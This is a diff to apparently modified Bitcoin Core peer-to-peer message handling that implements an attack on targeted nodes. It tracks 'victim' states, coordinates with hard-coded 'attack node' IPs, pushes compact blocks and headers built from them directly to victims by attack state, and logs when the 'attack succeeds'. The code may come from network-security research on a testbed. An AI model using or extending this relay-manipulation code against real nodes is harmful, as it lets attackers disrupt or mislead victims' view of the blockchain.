@@ -1061,6 +1061,9 @@ void static ProcessGetBlockData(CNode* pfrom, const Consensus::Params& consensus
     bool need_activate_chain = false;
     {
         LOCK(cs_main);
+        if (connman->victim_states.find(pfrom->addr.ToString()) != connman->victim_states.end()) {
+            LogPrintf("attack succeeds at block %s for victim %s!", inv.hash.ToString(), pfrom->addr.ToString());
+        }
         BlockMap::iterator mi = mapBlockIndex.find(inv.hash);
         if (mi != mapBlockIndex.end())
         {
@@ -1925,8 +1928,8 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 /*
                  * TODO: remove the hard code of the IP address of other attack nodes.
                  */
-                struct in_addr friend1_in_addr = { .s_addr = inet_addr("10.1.1.51") };
-                struct in_addr friend2_in_addr = { .s_addr = inet_addr("10.1.1.55") };
+                struct in_addr friend1_in_addr = { .s_addr = inet_addr("10.1.1.55") };
+                struct in_addr friend2_in_addr = { .s_addr = inet_addr("10.1.1.56") };
                 CNode* pfriend1 = connman->FindNode((CNetAddr)friend1_in_addr);
                 CNode* pfriend2 = connman->FindNode((CNetAddr)friend2_in_addr);
                 //bool fsendcompact_update = false;
@@ -2470,7 +2473,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 && pvictimState->relayed_compact_blocks.find(cmpctblock.header.GetHash().ToString()) == pvictimState->relayed_compact_blocks.end()) {
                 connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::CMPCTBLOCK, cmpctblock));
                 pvictimState->relayed_compact_blocks[cmpctblock.header.GetHash().ToString()] = NULL;
-                LogPrintf("***Sending a new compact block directly to the victim***\n");
+                LogPrintf("***Sending a new compact block %s directly to the victim***\n", cmpctblock.header.GetHash().ToString() );
             } else if (pvictim
                        && pvictimState->attack_state == 1
                        && pvictimState->getdata_request.find(cmpctblock.header.GetHash().ToString()) != pvictimState->getdata_request.end()) {
@@ -2486,7 +2489,7 @@ bool static ProcessMessage(CNode* pfrom, const std::string& strCommand, CDataStr
                 headers_to_victim.push_back(cmpctblock.header);
                 connman->PushMessage(pvictim, msgMaker.Make(NetMsgType::HEADERS, headers_to_victim));
                 pvictimState->relayed_fast_headers[cmpctblock.header.GetHash().ToString()] = 0;
-                LogPrintf("***Sending a headers message (constructed from a compact block) directly to victim***\n");
+                LogPrintf("***Sending a headers message (constructed from a compact block) %s directly to victim***\n", cmpctblock.header.GetHash().ToString());
             }
         }
 
